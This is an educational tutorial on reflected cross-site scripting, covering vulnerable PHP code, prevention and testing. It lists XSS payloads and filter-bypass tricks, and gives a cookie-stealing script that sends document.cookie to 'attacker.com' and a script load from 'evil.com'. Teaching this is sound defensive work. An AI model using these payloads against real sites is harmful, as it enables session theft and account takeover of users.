<img width="1890" height="750" alt="S" src="https://github.com/user-attachments/assets/16d36e0f-b978-449c-9a17-f95c3ae7bb3b" />

## What is Reflected XSS?

**Reflected Cross-Site Scripting (XSS)** is a web vulnerability that allows an attacker to inject malicious JavaScript code into a web application’s response, which is **immediately reflected** (sent back) to the user without proper sanitization or encoding.

The term “reflected” means the payload is not stored anywhere on the server. Instead, it is sent to the server and returned in the **same HTTP response**.

This usually happens when:

1. A web application includes user input in the response (like search terms or error messages).
2. That input is **not properly encoded or sanitized**.
3. The browser interprets it as **executable code**, not just text.

---

## Key Characteristics of Reflected XSS

| Feature            | Description                                                   |
| ------------------ | ------------------------------------------------------------- |
| Payload stored?    | No (payload is sent in the request and reflected immediately) |
| Execution context  | Happens in the victim's browser                               |
| Typical injection  | URL parameters, form fields, headers                          |
| Requires victim?   | Yes, the attacker must trick the victim into visiting a link  |
| Server involvement | The server reflects the input but does not store it           |

---

## How Reflected XSS Works 

Let’s break it down in detail:

### 1. The Web Application Reflects Input

Many web applications include user input in the response page. For example, a search form that shows:

```
You searched for: <user_input>
```

The user input might come from a URL parameter, like:

```
https://vulnerable.com/search?q=apple
```

The server returns this:

```html
<html>
  <body>
    You searched for: apple
  </body>
</html>
```

### 2. Attacker Crafts a Malicious Payload

Instead of a normal input like `apple`, the attacker injects malicious JavaScript:

```
https://vulnerable.com/search?q=<script>alert(1)</script>
```

The server responds with:

```html
<html>
  <body>
    You searched for: <script>alert(1)</script>
  </body>
</html>
```

Since there’s no output encoding, the browser **interprets the `<script>` tag**, and the JavaScript is executed.

### 3. Victim Visits the Malicious Link

The attacker must **deliver the malicious URL** to a victim. This can happen via:

* Email
* Social media
* Chat applications
* Forums

Once the victim clicks the link, their browser renders the response, and the JavaScript code runs in their browser context.

---

## Practical Code Example

### Vulnerable PHP code:

```php
<?php
  $q = $_GET['q'];
  echo "You searched for: " . $q;
?>
```

### Dangerous Request:

```
http://example.com/search.php?q=<script>alert(1)</script>
```

### Server Output:

```html
You searched for: <script>alert(1)</script>
```

### What Happens?

The browser executes the JavaScript code and pops up an alert box with the message `1`.

---

## Where Can Reflected XSS Be Found?

Reflected XSS can occur anywhere user-controlled input is reflected into the response. Common injection points include:

* **GET parameters in the URL** (e.g., `?q=`)
* **POST body parameters**
* **Form submissions**
* **HTTP headers** like `Referer`, `User-Agent`
* **Error messages**
* **Redirect URLs**
* **Search boxes**

---

## Types of Payloads Used in Reflected XSS

Depending on the context, attackers might use different types of payloads. Here are common examples:

### Basic payload:

```html
<script>alert(1)</script>
```

### Image tag with JavaScript:

```html
<img src="x" onerror="alert(1)">
```

### Anchor tag with JavaScript:

```html
<a href="javascript:alert(1)">Click</a>
```

### SVG tag with onload:

```html
<svg onload=alert(1)>
```

### Encoded payload (URL encoded):

```
%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

This is interpreted by the browser as:

```html
<script>alert(1)</script>
```

---

## Bypassing Basic Filters

Some websites try to block XSS by filtering specific strings like `<script>`. However, attackers can often bypass these filters.

Examples of bypass techniques:

1. Using different tags:

```html
<img src=x onerror=alert(1)>
```

2. Using event handlers:

```html
<body onload=alert(1)>
```

3. Breaking out of attributes:

```html
"><script>alert(1)</script>
```

4. Encoding parts of the payload:

```html
<script%20src=//evil.com/xss.js></script>
```

---

## Real-World Impact of Reflected XSS

Although Reflected XSS might seem simple, it can be extremely dangerous when combined with social engineering. Real-world impacts include:

* **Session hijacking**: Stealing cookies and session tokens
* **Phishing**: Redirecting to fake login pages
* **Keylogging**: Logging keystrokes in the browser
* **Account takeover**
* **Defacing websites** (if the attack modifies DOM elements)
* **Browser exploitation**: Loading browser-based malware

Example of cookie stealing:

```html
<script>
  fetch('http://attacker.com/steal?c=' + document.cookie);
</script>
```

---

## How to Prevent Reflected XSS

Proper mitigation involves multiple layers of defense:

### 1. **Output Encoding**

* Never insert raw user input into HTML, JavaScript, or CSS without escaping it.
* Use platform-specific escaping functions:

  * In PHP: `htmlspecialchars($input, ENT_QUOTES, 'UTF-8')`
  * In JavaScript: avoid `innerHTML`, use `textContent` instead.

### 2. **Input Validation**

* Validate input against expected types, lengths, or patterns.
* For example, if expecting a number, ensure it's numeric.

### 3. **Use Security Headers**

* Content Security Policy (CSP) helps reduce XSS risk by controlling script sources:

  ```
  Content-Security-Policy: default-src 'self'; script-src 'self'
  ```

### 4. **Use Frameworks with Built-in Protection**

* React, Angular, Vue.js automatically escape most output by default.

### 5. **HTTPOnly Cookies**

* Mark cookies as `HttpOnly` to prevent JavaScript access to session cookies:

  ```
  Set-Cookie: session=abc123; HttpOnly
  ```

---

## How to Test for Reflected XSS

Here’s a simple methodology:

1. Identify all input parameters (URL, form fields, headers).
2. Test each parameter with a basic XSS payload:

   ```
   <script>alert(1)</script>
   ```
3. Observe the response:

   * Is the payload reflected?
   * Is it encoded or interpreted as HTML?
4. Try payloads in different contexts (HTML, attributes, script blocks).
5. Use tools:

   * **Burp Suite** (manual testing and scanner)
   * **XSStrike** (automated fuzzing and XSS detection)
   * **OWASP ZAP**

---

## Summary Table

| Topic              | Details                                                 |
| ------------------ | ------------------------------------------------------- |
| Vulnerability Type | Reflected XSS                                           |
| Trigger            | User input reflected into HTML output without encoding  |
| Stored?            | No                                                      |
| Delivered By       | Malicious URL or request                                |
| Requires Victim?   | Yes, victim must visit attacker-crafted URL             |
| Main Prevention    | Output encoding + CSP + input validation                |
| Risk               | High (especially if session or cookies can be accessed) |

---

## Final Example Summary

Let’s wrap with a real-world-style scenario.

1. A page at:

   ```
   https://bank.com/error?msg=Invalid+PIN
   ```

   returns:

   ```html
   Error: Invalid PIN
   ```

2. Attacker modifies the URL to:

   ```
   https://bank.com/error?msg=<script>alert('Hacked')</script>
   ```

3. The server responds with:

   ```html
   Error: <script>alert('Hacked')</script>
   ```

4. The browser executes the script — that’s reflected XSS.

---

###  Reflected XSS HackerOne Reports

| Vulnerability & Company           | Description                                                         | Report Link                                                        |
| --------------------------------- | ------------------------------------------------------------------- | ------------------------------------------------------------------ |
| **Glassdoor – Reflected XSS**     | RXSS via the `utm_source` parameter on Glassdoor employer/job pages | [#846338](https://hackerone.com/reports/846338)    |
| **Glassdoor (2) – Reflected XSS** | Another RXSS via a different parameter on Glassdoor                 | [#1265390](https://hackerone.com/reports/1265390)  |
| **PUBG – Reflected XSS**          | JavaScript injection through query parameters on pubg.com           | [#751870](https://hackerone.com/reports/751870)    |
| **HackerOne – Reflected XSS**     | XSS on HackerOne’s own site via endpoints for embed/content         | [#840759](https://hackerone.com/reports/840759)    |
| **Equifax – Reflected XSS**       | RXSS inside `Analytics.trackEvent` function on Equifax site         | [#1818163](https://hackerone.com/reports/1818163)  |
| **Shopify – Reflected XSS**       | Reflected XSS affecting help.shopify.com via `returnTo` parameter   | [#1940245](https://hackerone.com/reports/1940245)  |

